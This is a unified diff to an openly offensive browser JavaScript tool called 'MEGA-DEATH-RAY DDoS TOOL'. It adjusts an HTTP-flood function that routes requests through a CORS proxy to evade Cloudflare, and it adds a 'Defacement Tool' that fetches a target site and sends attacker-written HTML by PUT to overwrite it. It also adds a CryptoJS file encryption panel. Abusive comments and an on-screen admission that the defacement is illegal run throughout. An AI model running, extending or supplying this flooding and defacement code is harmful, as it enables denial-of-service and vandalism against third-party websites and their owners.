@@ -1,4 +1,4 @@
-// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.6)
+// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.7)
 // WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
 // By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
 // ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.
@@ -239,14 +239,12 @@ async function httpFlood(url, hexBytes, proxy) {
             redirect: 'follow', // Follow redirects to try and bypass Cloudflare
             signal: controller.signal,
         };
-
-        // Proxy integration using an external service (e.g., CORSproxy)
+    //Proxy Integration with CORSproxy
         if (proxy) {
-            const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(proxy)}`
-            fetchOptions.proxy = proxyUrl;  // Use CORSproxy to forward the request
+            const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(proxy)}`;
+            fetchOptions.proxy = proxyUrl;
             console.log(`Using proxy: ${proxy} through CORSproxy`);
             logAction(`Using proxy: ${proxy} through CORSproxy`);
-
         }
         const response = await fetch(url, fetchOptions);
 
@@ -468,3 +466,200 @@ Particle.prototype.draw = function() {
     particleCtx.closePath();
     particleCtx.fill();
 };
+
+// Defacement Tool Integration
+
+const defaceDiv = document.createElement('div');
+defaceDiv.style.margin = '10px';
+defaceDiv.innerHTML = `
+    <h2 style="color: darkblue;">Defacement Tool</h2>
+    <input type="text" id="defaceTargetUrl" placeholder="Enter target URL for defacement, you degenerate" style="padding: 10px; margin: 10px; width: 300px; background-color: black; color: darkblue; border: 1px solid purple;">
+    <textarea id="defaceCode" placeholder="Enter HTML code for defacement, you maniac" style="padding: 10px; margin: 10px; width: 300px; height: 100px; background-color: black; color: darkblue; border: 1px solid purple;"></textarea>
+    <button id="backupSite" style="background-color: darkgreen; color: white; padding: 10px; border: 2px solid darkblue; margin-top: 5px;">Backup Site</button>
+    <button id="previewDeface" style="background-color: darkblue; color: white; padding: 10px; border: 2px solid purple; margin-top: 5px;">Preview Defacement</button>
+    <button id="applyDeface" style="background-color: darkred; color: white; padding: 10px; border: 2px solid darkred; margin-top: 5px;">Apply Defacement</button>
+    <button id="restoreSite" style="background-color: darkgreen; color: white; padding: 10px; border: 2px solid darkblue; margin-top: 5px;">Restore Site</button>
+    <a id="backupLink" style="color: darkblue; margin: 10px;" download="site_backup.html"></a>
+`;
+document.body.appendChild(defaceDiv);
+
+let originalSiteContent = '';
+
+// Function to fetch content via CORS proxy
+async function fetchContentWithProxy(url) {
+    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(url)}`;
+    try {
+        const response = await fetch(proxyUrl, {
+            mode: 'cors', // Required for CORS proxy
+        });
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        return await response.text();
+    } catch (error) {
+        console.error('Noodles Inc: Error fetching content with proxy:', error);
+        logAction(`Error fetching content with proxy: ${error}`);
+        alert(`Noodles Inc: Failed to fetch content. Check console for details. Error: ${error}`);
+        return null;
+    }
+}
+
+document.getElementById('backupSite').addEventListener('click', async () => {
+    const targetUrl = document.getElementById('defaceTargetUrl').value;
+    if (!targetUrl) {
+        alert("Noodles Inc: Enter a target URL for backup, you moron!");
+        return;
+    }
+
+    originalSiteContent = await fetchContentWithProxy(targetUrl);
+    if (originalSiteContent) {
+        const blob = new Blob([originalSiteContent], { type: 'text/html' });
+        const backupLink = document.getElementById('backupLink');
+        backupLink.href = URL.createObjectURL(blob);
+        backupLink.download = 'site_backup.html';
+        backupLink.textContent = 'Download Site Backup';
+        logAction('Site backup created and ready for download.');
+        alert('Noodles Inc: Site backup created. Download it now, or regret it later!');
+    } else {
+        alert("Noodles Inc: Failed to backup site. Check console for details.");
+    }
+});
+
+document.getElementById('previewDeface').addEventListener('click', () => {
+    const defaceCode = document.getElementById('defaceCode').value;
+    if (!defaceCode) {
+        alert("Noodles Inc: Enter defacement code, you idiot!");
+        return;
+    }
+
+    const previewWindow = window.open('', '_blank');
+    previewWindow.document.write(defaceCode);
+    previewWindow.document.close();
+});
+
+document.getElementById('applyDeface').addEventListener('click', async () => {
+    const targetUrl = document.getElementById('defaceTargetUrl').value;
+    const defaceCode = document.getElementById('defaceCode').value;
+
+    if (!targetUrl || !defaceCode) {
+        alert("Noodles Inc: Enter both target URL and defacement code, you moron!");
+        return;
+    }
+
+    if (!confirm("Noodles Inc: ARE YOU FUCKING SURE YOU WANT TO DEFACE THIS SITE? THIS IS ILLEGAL!")) {
+        return;
+    }
+
+    try {
+        // Attempt to send a PUT or POST request to replace the site's content
+        const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`; // Use CORS proxy
+        const response = await fetch(proxyUrl, {
+            method: 'PUT', // Or 'POST', depending on the server's configuration
+            mode: 'cors',
+            headers: {
+                'Content-Type': 'text/html', // Set the content type to HTML
+            },
+            body: defaceCode, // Send the defacement code in the body
+        });
+
+        if (response.ok) {
+            logAction('Site defaced successfully! You are a monster.');
+            alert('Noodles Inc: Site defaced successfully! Enjoy your handiwork, you degenerate.');
+        } else {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+    } catch (error) {
+        console.error('Noodles Inc: Error applying defacement:', error);
+        logAction(`Error applying defacement: ${error}`);
+        alert(`Noodles Inc: Failed to deface site. Check console for details. Error: ${error}`);
+    }
+});
+
+document.getElementById('restoreSite').addEventListener('click', () => {
+    if (!originalSiteContent) {
+        alert("Noodles Inc: No backup available. Backup the site first, you dumbass!");
+        return;
+    }
+
+    const restoreWindow = window.open('', '_blank');
+    restoreWindow.document.write(originalSiteContent);
+    restoreWindow.document.close();
+    logAction('Site restored to original content.');
+    alert('Noodles Inc: Site restored to original content. Good job not getting caught!');
+});
+
+// File Encryption Tool Integration
+
+const encryptionDiv = document.createElement('div');
+encryptionDiv.style.margin = '10px';
+encryptionDiv.innerHTML = `
+    <h2 style="color: darkblue;">File Encryption Tool</h2>
+    <input type="file" id="fileToEncrypt" style="margin: 10px; color: darkblue;">
+    <input type="password" id="encryptionPassword" placeholder="Enter encryption password, you sneaky bastard" style="padding: 10px; margin: 10px; width: 300px; background-color: black; color: darkblue; border: 1px solid purple;">
+    <button id="encryptFile" style="background-color: darkred; color: white; padding: 10px; border: 2px solid darkred; margin-top: 5px;">Encrypt File</button>
+    <button id="decryptFile" style="background-color: darkgreen; color: white; padding: 10px; border: 2px solid darkblue; margin-top: 5px;">Decrypt File</button>
+    <a id="downloadEncryptedFile" style="color: darkblue; margin: 10px;" download="encrypted_file.enc"></a>
+    <a id="downloadDecryptedFile" style="color: darkblue; margin: 10px;" download="decrypted_file.txt"></a>
+`;
+document.body.appendChild(encryptionDiv);
+
+document.getElementById('encryptFile').addEventListener('click', async () => {
+    const fileToEncrypt = document.getElementById('fileToEncrypt').files[0];
+    const encryptionPassword = document.getElementById('encryptionPassword').value;
+
+    if (!fileToEncrypt || !encryptionPassword) {
+        alert("Noodles Inc: Select a file and enter a password, you twat!");
+        return;
+    }
+
+    const reader = new FileReader();
+    reader.onload = async function(event) {
+        const fileContent = event.target.result;
+        const encryptedContent = CryptoJS.AES.encrypt(fileContent, encryptionPassword).toString();
+
+        const blob = new Blob([encryptedContent], { type: 'text/plain' });
+        const downloadLink = document.getElementById('downloadEncryptedFile');
+        downloadLink.href = URL.createObjectURL(blob);
+        downloadLink.download = 'encrypted_file.enc';
+        downloadLink.textContent = 'Download Encrypted File';
+        logAction('File encrypted and ready for download. You are evil.');
+        alert('Noodles Inc: File encrypted. Download it now and hide your sins!');
+    };
+    reader.readAsText(fileToEncrypt);
+});
+
+document.getElementById('decryptFile').addEventListener('click', async () => {
+    const fileToEncrypt = document.getElementById('fileToEncrypt').files[0];
+    const encryptionPassword = document.getElementById('encryptionPassword').value;
+
+    if (!fileToEncrypt || !encryptionPassword) {
+        alert("Noodles Inc: Select a file and enter a password, you dumbfuck!");
+        return;
+    }
+
+    const reader = new FileReader();
+    reader.onload = async function(event) {
+        const fileContent = event.target.result;
+
+        try {
+            const decryptedContent = CryptoJS.AES.decrypt(fileContent, encryptionPassword).toString(CryptoJS.enc.Utf8);
+
+            if (decryptedContent) {
+                const blob = new Blob([decryptedContent], { type: 'text/plain' });
+                const downloadLink = document.getElementById('downloadDecryptedFile');
+                downloadLink.href = URL.createObjectURL(blob);
+                downloadLink.download = 'decrypted_file.txt';
+                downloadLink.textContent = 'Download Decrypted File';
+                logAction('File decrypted successfully. Secrets revealed!');
+                alert('Noodles Inc: File decrypted. Your secrets are out!');
+            } else {
+                alert("Noodles Inc: Invalid password or file is not encrypted. You fucked up!");
+            }
+        } catch (error) {
+            console.error('Noodles Inc: Decryption error:', error);
+            logAction(`Decryption error: ${error}`);
+            alert("Noodles Inc: Decryption failed. Check console for details.");
+        }
+    };
+    reader.readAsText(fileToEncrypt);
+});
